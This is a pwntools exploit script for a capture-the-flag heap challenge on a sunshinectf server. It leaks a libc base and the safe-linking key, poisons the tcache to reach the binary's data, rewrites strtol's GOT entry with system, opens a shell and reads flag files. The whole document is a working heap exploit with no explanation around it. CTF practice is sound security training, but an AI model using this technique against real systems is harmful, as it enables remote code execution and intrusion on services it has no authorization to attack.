import sys, os, re, time
from pwn import *
context.arch='amd64'; context.log_level='warning'
t0=time.time()
def T(msg): print('[%6.2fs] %s' % (time.time()-t0, msg)); sys.stdout.flush()
io = remote('chal.sunshinectf.games',26004)
def menu(c): io.sendlineafter(b'>>> ', str(c).encode())
def ow(n,s):
    menu(1); io.sendlineafter(b'Wallet name: ',n); io.sendlineafter(b'Ledger size',str(s).encode()); io.recvuntil(b'\n')
def cw(i):
    menu(5); io.sendlineafter(b'(0-15): ',str(i).encode()); io.recvuntil(b'CACHE MONEY!')
def tr(a,b):
    menu(4); io.sendlineafter(b'(0-15): ',str(a).encode()); io.sendlineafter(b'(0-15): ',str(b).encode()); io.recvuntil(b'Smart money move!')
def dep(i,p):
    menu(2); io.sendlineafter(b'(0-15): ',str(i).encode()); io.recvuntil(b'Enter transaction data: '); io.send(p); return io.recvuntil(b'\n')
def wd(i,n):
    menu(3); io.sendlineafter(b'(0-15): ',str(i).encode()); io.recvuntil(b'bytes):\n    '); d=io.recvn(n); io.recvuntil(b'Current balance:'); return d
T('connected')
ow(b'S',0x80); ow(b'D',0x80)
for i in range(7): ow(b'W%d'%i,0x80)
T('9 wallets opened')
for i in range(2,9): cw(i)
T('7 closed')
tr(0,1)
leak=wd(1,0x80); unsorted=u64(leak[0:8]); libc=unsorted-0x203b20
T('libc leak %#x  base %#x' % (unsorted, libc))
ow(b'P0',0x20); ow(b'P1',0x20); ow(b'P2',0x20)
T('poison wallets opened')
tr(2,3); l=wd(3,0x20); safe=u64(l[0:8])
T('safe key %#x' % safe)
dep(3,p64(0)+p64(0)); tr(3,4); dep(4,p64(safe^0x4040c0)+p64(0))
T('poison written')
ow(b'P3',0x20); ow(b'P4',0x20)
T('poisoned malloc done')
r=dep(6,p64(0x404000)+p64(0x70)+p64(0x4040a8)+p64(0))
T('fake wallet set: %r' % r)
got=wd(2,0x70)
T('got read: free=%#x read=%#x' % (u64(got[0:8]), u64(got[40:48])))
r=dep(6,p64(0x404040)+p64(8)+p64(0x4040a8)+p64(0))
T('slot0->strtol@got : %r' % r)
r=dep(2,p64(libc+0x58740))
T('system written : %r' % r)
io.sendline(b'/bin/sh')
time.sleep(0.5)
io.sendline(b'id; cat flag.txt /flag /home/*/flag.txt 2>/dev/null; echo DONE')
time.sleep(1.0)
print(io.recvrepeat(3))
